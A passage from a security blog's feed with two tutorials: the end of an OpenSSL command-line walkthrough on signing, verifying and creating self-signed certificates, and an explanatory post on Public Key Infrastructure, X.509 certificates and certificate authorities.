&lt;h3 id=&quot;332-signing-the-digest-with-the-private-key&quot;&gt;3.3.2-Signing the digest with the private key&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@bbsec:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;openssl rsautl &lt;span class=&quot;nt&quot;&gt;-sign&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-in&lt;/span&gt; plaintext-sha1.txt &lt;span class=&quot;nt&quot;&gt;-out&lt;/span&gt; signedfile &lt;span class=&quot;nt&quot;&gt;-inkey&lt;/span&gt; privkey.pem 
root@bbsec:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;signedfile 
&lt;span class=&quot;s2&quot;&gt;&quot;�9�O��N�q�k������Kc��ګ�4ci��GC����6�vq���2�K�iy���Q�s���!*��P�����!M��s���/o�,�b���&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$iJ&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;���������s��?4�!�a&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;333-verifying-the-digital-signature&quot;&gt;3.3.3-Verifying the digital signature&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@bbsec:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;openssl rsautl &lt;span class=&quot;nt&quot;&gt;-verify&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-in&lt;/span&gt; signedfile &lt;span class=&quot;nt&quot;&gt;-pubin&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-inkey&lt;/span&gt; pubkey.pem 
SHA1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;plaintext.txt&lt;span class=&quot;o&quot;&gt;)=&lt;/span&gt; dc2fe0f7a744a48ded8ce61710c385457e35296a &lt;span class=&quot;c&quot;&gt;#Decrypted signature&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;As you can tell, the digest of the data and the result of the decrypted signature validates each other. That means signature is valid.&lt;/p&gt;

&lt;h1 id=&quot;4-creating-digital-certificates-pki&quot;&gt;4-CREATING DIGITAL CERTIFICATES (PKI)&lt;/h1&gt;

&lt;p&gt;If you are not familiar with the &lt;em&gt;Public Key Infrastructure&lt;/em&gt;, you can read it &lt;a href=&quot;https://www.bbsec.net/2022/01/01/public-key-infrastructure/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&quot;41-generate-a-key-pair&quot;&gt;4.1-Generate a key pair&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@bbsec:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;openssl genrsa 2048 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; myprivatekey.pem
Generating RSA private key, 2048 bit long modulus &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2 primes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
..........+++++
..................................................................+++++
e is 65537 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x010001&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
root@bbsec:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;openssl rsa &lt;span class=&quot;nt&quot;&gt;-in&lt;/span&gt; myprivatekey.pem &lt;span class=&quot;nt&quot;&gt;-pubout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; mypublickey.pem
writing RSA key&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;42-generate-a-csr&quot;&gt;4.2-Generate a CSR&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;openssl req &lt;span class=&quot;nt&quot;&gt;-new&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-key&lt;/span&gt; myprivatekey.pem &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; cert_req.csr

Country Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2 letter code&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;AU]:tr
State or Province Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;full name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Some-State]:
Locality Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;eg, city&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;:Istanbul
Organization Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;eg, company&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Internet Widgits Pty Ltd]:BBSec
Organizational Unit Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;eg, section&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;:Cyber-Sec
Common Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;e.g. server FQDN or YOUR name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;:
Email Address &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;:imbarisburak_buisiness@protonmail.com
A challenge password &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;:111111
An optional company name &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;: &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;43-act-as-our-own-ca-to-self-sign-our-own-certificate&quot;&gt;4.3-Act as our own CA to self-sign our own certificate&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;openssl x509 &lt;span class=&quot;nt&quot;&gt;-req&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-in&lt;/span&gt; cert_req.csr &lt;span class=&quot;nt&quot;&gt;-signkey&lt;/span&gt; myprivatekey.pem &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; signed.cer
Signature ok
&lt;span class=&quot;nv&quot;&gt;subject&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;C &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt;, ST &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Some-State, L &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Istanbul, O &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; BBSec, OU &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Cyber-Sec, emailAddress &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; imbarisburak_buisiness@protonmail.com
Getting Private key&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;44-display-all-the-information-in-the-certificate&quot;&gt;4.4-Display all the information in the certificate&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@bbsec:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;openssl x509 &lt;span class=&quot;nt&quot;&gt;-in&lt;/span&gt; signed.cer &lt;span class=&quot;nt&quot;&gt;-text&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-noout&lt;/span&gt;
Certificate:
    Data:
        Version: 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        Serial Number:
            34:1c:a6:c0:0d:06:8f:2c:58:46:ae:1b:17:f1:53:b6:27:52:6c:f8
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: C &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt;, ST &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Some-State, L &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Istanbul, O &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; BBSec, OU &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Cyber-Sec, emailAddress &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; imbarisburak_buisiness@protonmail.com
        Validity
            Not Before: Jan  5 19:52:19 2022 GMT
            Not After : Feb  4 19:52:19 2022 GMT
        Subject: C &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt;, ST &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Some-State, L &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Istanbul, O &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; BBSec, OU &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Cyber-Sec, emailAddress &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; imbarisburak_buisiness@protonmail.com
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                RSA Public-Key: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2048 bit&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
                Modulus:
                    00:d4:4c:57:45:97:1b:30:d8:fa:b8:5d:52:9f:be:
                    21:d8:d2:11:4b:34:bc:55:53:00:5c:e9:00:9b:87:
                    2d:6b:b1:f8:9e:3a:75:fb:96:9a:31:41:c8:2a:5e:
                    54:10:20:9f:1c:36:4d:b2:6c:66:4e:80:d3:04:19:
                    9f:3a:1a:21:3b:d1:f5:cf:5f:a4:06:6c:b5:38:bb:
                    01:8f:1f:51:82:67:6a:32:01:2d:06:83:03:79:95:
                    42:63:1a:01:87:9e:bc:17:ba:1c:03:1c:a0:92:dd:
                    56:19:a0:eb:38:42:79:43:4b:f2:d8:28:9d:f6:5b:
                    59:38:27:b7:bc:e2:23:31:57:5f:9c:46:36:00:4c:
                    b9:a9:ba:1c:74:73:3c:ad:35:ed:60:02:03:53:28:
                    44:74:c9:e9:f9:05:7f:c1:9e:57:7e:09:c3:41:17:
                    5c:77:36:08:92:64:d4:73:e8:d1:eb:79:57:dd:04:
                    b8:b4:f2:20:f0:42:df:03:68:a3:ca:f0:69:66:a3:
                    46:d4:cd:69:cd:2b:32:8e:5d:06:5c:b8:b0:b5:78:
                    3e:72:1d:cf:95:78:ea:ea:85:60:05:0c:e6:0f:3b:
                    06:3f:78:54:7f:bb:23:d8:1b:25:d8:60:ef:a2:ee:
                    21:4a:4d:22:3b:80:6f:3b:b7:42:8e:86:66:aa:67:
                    54:c9
                Exponent: 65537 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x10001&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
    Signature Algorithm: sha256WithRSAEncryption
         8c:6f:7a:b2:a7:ed:96:ed:7c:26:93:6d:4e:6c:07:c4:1b:76:
         7e:ef:08:1a:4e:15:f8:35:38:dd:88:d3:67:1a:b7:56:ee:7b:
         6e:8a:a9:e3:05:2a:69:55:3c:ec:8b:c1:45:c4:dd:97:54:e6:
         5b:c6:e4:b0:ea:b2:00:e7:e1:f6:d2:46:b2:65:67:e1:d8:bb:
         f9:89:c1:93:05:7c:6a:8c:ef:c9:76:7a:e8:3e:cc:90:21:25:
         f3:c5:4a:9f:87:18:3c:cf:50:2a:7a:1e:b8:49:65:0e:d2:a0:
         d4:cb:8b:27:5a:40:76:ee:52:30:2a:3a:70:63:2d:97:a7:31:
         49:96:60:d9:d9:17:35:02:57:f0:cd:1f:b0:54:15:49:e3:5f:
         1d:19:fd:3e:ff:03:58:f5:cd:ec:f3:a9:9e:e5:ff:b9:bc:d8:
         3d:f3:0a:4f:f5:18:5b:b8:86:4a:cb:6f:89:40:f7:3e:f5:f0:
         6c:be:d0:fd:54:91:43:0f:aa:8a:58:b7:f9:80:c9:2c:07:38:
         f6:6b:18:54:e7:d5:00:8d:ad:36:0f:47:6f:01:d6:2c:79:1b:
         04:65:61:21:1d:e7:b2:72:5b:a5:ab:01:ca:f4:33:7e:26:69:
         e9:4f:dd:f9:c9:60:27:60:a2:0c:98:2d:d4:c9:28:c3:c7:5b:
         f2:51:34:b9&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;45-put-our-certificate-and-key-in-a-pkcs-12-container&quot;&gt;4.5-Put our certificate and key in a PKCS #12 container&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@bbsec:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;openssl pkcs12 &lt;span class=&quot;nt&quot;&gt;-export&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-in&lt;/span&gt; signed.cer &lt;span class=&quot;nt&quot;&gt;-inkey&lt;/span&gt; myprivatekey.pem &lt;span class=&quot;nt&quot;&gt;-out&lt;/span&gt; p12cert.p12
Enter Export Password:
Verifying - Enter Export Password:&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;46-display-information-in-a-pkcs12-file&quot;&gt;4.6-Display information in a PKCS12 file&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@bbsec:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;openssl pkcs12 &lt;span class=&quot;nt&quot;&gt;-info&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-in&lt;/span&gt; p12cert.p12 &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;46-create-a-key-and-a-self-signed-certificate-in-one-command&quot;&gt;4.6-Create a key and a self-signed certificate in one command&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;openssl req &lt;span class=&quot;nt&quot;&gt;-new&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-x509&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-newkey&lt;/span&gt; rsa:2048 &lt;span class=&quot;nt&quot;&gt;-out&lt;/span&gt; new_cert.cer &lt;span class=&quot;nt&quot;&gt;-keyout&lt;/span&gt; new_key.pem&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

</description>
        <pubDate>Wed, 05 Jan 2022 14:00:00 +0000</pubDate>
        <link>http://localhost:4000/2022/01/05/OpenSSL-CLI-Tool/</link>
        <guid isPermaLink="true">http://localhost:4000/2022/01/05/OpenSSL-CLI-Tool/</guid>
        
        <category>OpenSSL</category>
        
        <category>PKI</category>
        
        <category>PKC</category>
        
        <category>Cryptography</category>
        
        <category>x509</category>
        
        <category>Encryption</category>
        
        
      </item>
    
      <item>
        <title>Public Key Infrastructure</title>
        <description>&lt;p&gt;This post will discuss all the terminologies behind the &lt;strong&gt;&lt;em&gt;Public Key Infrastructure (PKI)&lt;/em&gt;&lt;/strong&gt;.
It is essential to have knowledge of &lt;em&gt;Public Key Cryptography&lt;/em&gt;, &lt;em&gt;Encryption&lt;/em&gt; and &lt;em&gt;Digital Signing&lt;/em&gt; as the prequisition.&lt;/p&gt;

&lt;h1 id=&quot;what-is-pki&quot;&gt;WHAT IS PKI?&lt;/h1&gt;
&lt;p&gt;A &lt;a href=&quot;https://en.wikipedia.org/wiki/Public_key_infrastructure&quot;&gt;&lt;strong&gt;&lt;em&gt;Public Key Infrastructure (PKI)&lt;/em&gt;&lt;/strong&gt;&lt;/a&gt; is a collection of roles, policies, hardware, software, and procedures
required to produce, regulate, disperse, use, store, and revoke x.509 certificates and manage public-key encryption.&lt;/p&gt;
&lt;h1 id=&quot;why-pki-is-important&quot;&gt;WHY PKI IS IMPORTANT?&lt;/h1&gt;
&lt;p&gt;While public-key encryption solves the problem of the data’s legibility by everyone, PKI adds authentication mechanism on top of it.
Combination of those two mechanism together makes online communication much more trustworthy.&lt;/p&gt;
&lt;h1 id=&quot;real-life-scenario&quot;&gt;REAL LIFE SCENARIO&lt;/h1&gt;

&lt;p&gt;Let us examine this example:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;John&lt;/strong&gt;: Hey Robert, can you send those confidential data to Ashley?&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Robert&lt;/strong&gt;: Sure, but who is she?&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;John&lt;/strong&gt;: She is the HR manager of BBSec.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Robert&lt;/strong&gt;: All right.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;For Robert to send any confidential data to Ashley, he must find Ashley’s public-key. However, searching for her
public-key on the web would not be smart since there could be many other public-keys for other Ashleys. How can Robert
be confident that he uses the correct public-key from the Ashley he wants to communicate?
&lt;br /&gt;&lt;br /&gt;To solve this problem, what we call &lt;strong&gt;&lt;em&gt;x509 certificates&lt;/em&gt;&lt;/strong&gt; comes into play.&lt;/p&gt;

&lt;h1 id=&quot;what-is-an-x509-certificate&quot;&gt;WHAT IS AN X.509 CERTIFICATE?&lt;/h1&gt;

&lt;p&gt;&lt;em&gt;X.509&lt;/em&gt; is a standard procedure for public-key certificates. They are digital documents that validate the integrity of the 
association between identities such as organizations, individuals or websites, and their cryptographic key pairs.
&lt;br /&gt;&lt;br /&gt;An &lt;em&gt;X.509 certificate&lt;/em&gt; essentially contains those:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Identity’s name, address, email,etc.&lt;/li&gt;
  &lt;li&gt;Identity’s public-key.&lt;/li&gt;
  &lt;li&gt;The &lt;em&gt;Issuer&lt;/em&gt; of the certificate.&lt;/li&gt;
  &lt;li&gt;The &lt;em&gt;encrypted hash&lt;/em&gt; of the certificate.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;If Robert can find a certificate that binds Ashley’s name with her company BBSec, he can confidently tell that it is the correct
certificate he was looking for.
&lt;br /&gt;&lt;br /&gt;There are two more fields above, which are &lt;em&gt;Issuer&lt;/em&gt; and &lt;em&gt;encrypted hash&lt;/em&gt;. We will come to that later.&lt;/p&gt;

&lt;p&gt;Common applications that use X.509 certificates:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;TLS/SSL and HTTPS for encrypted and authenticated web browsing&lt;/li&gt;
  &lt;li&gt;S/MIME Protocol for encrypted and signed email.&lt;/li&gt;
  &lt;li&gt;Document signing&lt;/li&gt;
  &lt;li&gt;Client authentication&lt;/li&gt;
  &lt;li&gt;Goverment-issued electronic ID&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;certificate-authorities&quot;&gt;CERTIFICATE AUTHORITIES&lt;/h1&gt;

&lt;p&gt;However, what if Robert finds more than one certificate claiming to have Ashley’s public key? Now which one is the right one?
I can easily create a certificate identical to Ashley’s and put my public-key in it.
We need a mechanism to verify that the certificate assigned to a specific identity is one of its kind.
&lt;br /&gt;&lt;br /&gt;We have what we call &lt;strong&gt;&lt;em&gt;Certificate Authorities (CAs)&lt;/em&gt;&lt;/strong&gt; to solve this problem.  There are dozens of organizations that we 
trust to be authoritative. All operating systems and browsers come with built-in configured CAs. If a CA claims
a certificate is authentic, we will believe it. 
&lt;br /&gt;&lt;br /&gt;However, how does a CA indicate that the certificate in question is authentic?
By &lt;em&gt;signing&lt;/em&gt; it digitally. The signature of the CA must be checked to verify the authenticity of a certificate.
&lt;br /&gt;&lt;br /&gt; In the definition of an X.509 certificate above, there were two more fields left unexplained. &lt;em&gt;Issuer&lt;/em&gt; and &lt;em&gt;Encrypted Hash&lt;/em&gt;.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Issuer: The name of the organization (CA) that issued the certificate.&lt;/li&gt;
  &lt;li&gt;Encrypted Hash: the digital signature of the CA.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Let us continue to the Robert and Ashley example above:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Robert obtains certificate A that claims to be Ashley’s certificate and issued by X.&lt;/li&gt;
  &lt;li&gt;To verify that certificate A is authentic by verifying CA’s signature, Robert gets the public key of X from somewhere, then
decrypts the &lt;em&gt;encrypted hash&lt;/em&gt;, the digital signature, inside of certificate A.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The question is that Robert just downloaded X’s certificate from somewhere, so how can he tell that it is also authentic? The answer is, by looking
at the &lt;em&gt;Issuer&lt;/em&gt; of X, which is Y. Now, he must find the Y certificate to verify the signature on the X certificate. We can continue
to do that endlessly. It becomes an endless loop, and we have to stop at one point.
&lt;br /&gt;&lt;br /&gt;To solve this problem we have what we call the &lt;strong&gt;&lt;em&gt;Root CAs&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;

&lt;h1 id=&quot;what-is-a-root-ca&quot;&gt;WHAT IS A ROOT CA?&lt;/h1&gt;

&lt;p&gt;A &lt;strong&gt;&lt;em&gt;top-level, root CA&lt;/em&gt;&lt;/strong&gt; is a certificate authority that sits on the top of the authority hierarchy. CAs can sign their own certificates. These
are what we call &lt;em&gt;self-signed certificates&lt;/em&gt;. Since it is not possible to validate self-signed certificates with PKI, Root CAs 
distribute their keys &lt;em&gt;out-of-band&lt;/em&gt; (e.g. out-of-band distribution means non-electronic distributing, such as going to their offices
and getting their public key in person).
&lt;br /&gt;&lt;br /&gt;However, it would be harsh to go to the Root CAs office and collect their public key when you want to send an 
email to somebody. Web browsers come with more than 30 Root CAs. The browsers’ distributors are deciding who are truthful. By
using their browser, you trust their choice.
&lt;br /&gt;&lt;br /&gt;Let us get back to the Ashley and Robert example. If we assume that the certificate Y is a &lt;em&gt;self-signed&lt;/em&gt; certificate and the organization Y
is indeed a &lt;em&gt;Root CA&lt;/em&gt;, Robert can trust certificate A since X trusts A and Y trusts X.&lt;/p&gt;

&lt;h1 id=&quot;terminologies&quot;&gt;TERMINOLOGIES&lt;/h1&gt;

&lt;h2 id=&quot;x509&quot;&gt;X.509&lt;/h2&gt;
&lt;p&gt;The protocol’s itself.&lt;/p&gt;
&lt;h2 id=&quot;pkix&quot;&gt;PKIX&lt;/h2&gt;
&lt;p&gt;Stands for &lt;strong&gt;P&lt;/strong&gt;ublic  &lt;strong&gt;K&lt;/strong&gt;ey &lt;strong&gt;I&lt;/strong&gt;nfrastructure &lt;strong&gt;X&lt;/strong&gt;.509&lt;/p&gt;
&lt;h2 id=&quot;abstract-syntax-notation-one-asn1&quot;&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/ASN.1&quot;&gt;Abstract Syntax Notation One (ASN.1)&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;It is the syntax used to describe things in an X.509 certificate. For instancee, if the certificates were written in JSON, 
ASN.1 would be the syntax for the schema (This example is over-simplified).
Using ASN.1, it is possible to define data structures that 
can be transmitted over the network independently of software or hardware.&lt;/p&gt;
&lt;h3 id=&quot;der-pem-xer-per-ber-cer&quot;&gt;DER, PEM, XER, PER, BER, CER&lt;/h3&gt;
&lt;p&gt;Those are some of the popular encoding rules for ASN.1. 
&lt;br /&gt;&lt;em&gt;DER&lt;/em&gt; and &lt;em&gt;PEM&lt;/em&gt; are the most used.&lt;/p&gt;
&lt;h2 id=&quot;algorithm&quot;&gt;Algorithm&lt;/h2&gt;
&lt;p&gt;When the context is the PKI, it refers to cryptographic algorithms like “SHA1 with DSA”, “SHA1 with RSA”, etc. In order to
achieve cryptographic signing, first, we need to hash the data, then encrypt the hash. “SHA1 with RSA” would indicate that the
data hashed with SHA1 and encrypted with RSA.&lt;/p&gt;
&lt;h2 id=&quot;object-identifiers-oids&quot;&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Object_identifier&quot;&gt;Object Identifiers (OIDs)&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;Instead of using English to describe things in a X.509 certificate, &lt;em&gt;OIDs&lt;/em&gt; are being used.
For instance, in a certificate 
instead of referring to the encryption field as “RSA”, which would be a string value, you would see its’ integer OID value “1.2.840.11359”.
&lt;br /&gt;&lt;a href=&quot;https://www.alvestrand.no/objectid/top.html&quot;&gt;You can find the list of the registered OIDs here.&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;privacy-enhanced-mail-pem&quot;&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Privacy-Enhanced_Mail&quot;&gt;Privacy Enhanced Mail (PEM)&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;If you hear PEM, it usually refers to &lt;a href=&quot;https://asecuritysite.com/encryption/sigs3?a0=304e301006072a8648ce3d020106052b81040021033a0004eada93be10b2449e1e8bb58305d52008013c57107c1a20a317a6cba7eca672340c03d1d2e09663286691df55069fa25490c9dd9f9c0bb2b5&quot;&gt;DER&lt;/a&gt;. 
PEM is further encoded version of DER to base64.
Using PEM encoding can assist transmission over media that is sensitive to textual encodings.&lt;/p&gt;
&lt;h2 id=&quot;distinguished-name-dn&quot;&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/previous-versions/windows/desktop/ldap/distinguished-names?redirectedfrom=MSDN&quot;&gt;Distinguished Name (DN)&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;Just referring someone with his/her name would not be helpful to identify someone. 
&lt;em&gt;DN&lt;/em&gt; is used to identify someone uniquely by dividing attributes into fields like &lt;strong&gt;CN=Burak, DC=bbsec, DC=COM&lt;/strong&gt;.&lt;/p&gt;
&lt;h2 id=&quot;simple-pki-spki&quot;&gt;&lt;a href=&quot;https://crypto.stackexchange.com/questions/790/need-an-introduction-to-spki-or-spki-for-dummies&quot;&gt;Simple PKI (SPKI)&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;The PKI we were discussing (&lt;a href=&quot;https://www.ietf.org/rfc/rfc5280.txt&quot;&gt;RFC 5280&lt;/a&gt;) binds a certificate with &lt;em&gt;distinguished name&lt;/em&gt;.
SPKI (&lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc2692&quot;&gt;RFC 2692&lt;/a&gt;) binds public key to a set of permissions. Not commonly used.&lt;/p&gt;

&lt;h2 id=&quot;public-key-cryptography-standrat-pkcs&quot;&gt;&lt;a href=&quot;https://www.encryptionconsulting.com/public-key-cryptography-standards/&quot;&gt;Public Key Cryptography Standrat (PKCS)&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;PKCS&lt;/em&gt; is a set of standrats for PKI from 1 to 15. The PKCS standarts listed below are the most common and important ones.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;PKCS #1: RSA Cryptograpgy Standart&lt;/li&gt;
  &lt;li&gt;PKCS #3: Diffie-Hellman Key Agreement Standard&lt;/li&gt;
  &lt;li&gt;PKCS #7/CMS: Cryptographic Message Syntax Standard&lt;/li&gt;
  &lt;li&gt;PKCS #9: Selected Object Classes and Attribute Types&lt;/li&gt;
  &lt;li&gt;PKCS #10: Certification Request Syntax Standard&lt;/li&gt;
  &lt;li&gt;PKCS #12: Personal Information Exchange Syntax Standard&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;certificate-revocation-list-clr&quot;&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Certificate_revocation_list&quot;&gt;Certificate Revocation List (CLR)&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;These lists are published by some authorities’ servers to indicate which certificates have been revoked.
If you were to lose your credit card for whatever reason, you would like to revocate your credit card.
It works the same for the certificates too. You might lose your private key for whatever reason, or it can get stolen. In this case, 
you would like to revocate your X.509 certificate.&lt;/p&gt;

&lt;h2 id=&quot;online-certificate-status-protocol-ocsp&quot;&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Online_Certificate_Status_Protocol&quot;&gt;Online Certificate Status Protocol (OCSP)&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;An internet protocol used for gathering the revocation status of an X.509 certificate.&lt;/p&gt;

&lt;h2 id=&quot;certificate-signing-requests-csr&quot;&gt;&lt;a href=&quot;https://www.namecheap.com/support/knowledgebase/article.aspx/337/67/what-is-a-certificate-signing-request-csr/&quot;&gt;Certificate Signing Requests (CSR)&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;In order to get a certificate signed by a Root CA, a &lt;em&gt;Certificate Signing Request&lt;/em&gt; should be made to a Root CA.
There are meta-data that needs to be bundled which is specified by PKCS#10&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
Further reading and practice about how to create digital signatures and x.509 certificates furthermore how to sign and 
verify a document or certificate with &lt;a href=&quot;https://www.bbsec.net/2022/01/05/OpenSSL-CLI-Tool/&quot;&gt;&lt;em&gt;OpenSSL can be found here&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
</description>
        <pubDate>Sat, 01 Jan 2022 16:00:00 +0000</pubDate>
        <link>http://localhost:4000/2022/01/01/public-key-infrastructure/</link>
        <guid isPermaLink="true">http://localhost:4000/2022/01/01/public-key-infrastructure/</guid>
        
        <category>PKI</category>
        
        <category>PKC</category>
        
        <category>x509</category>
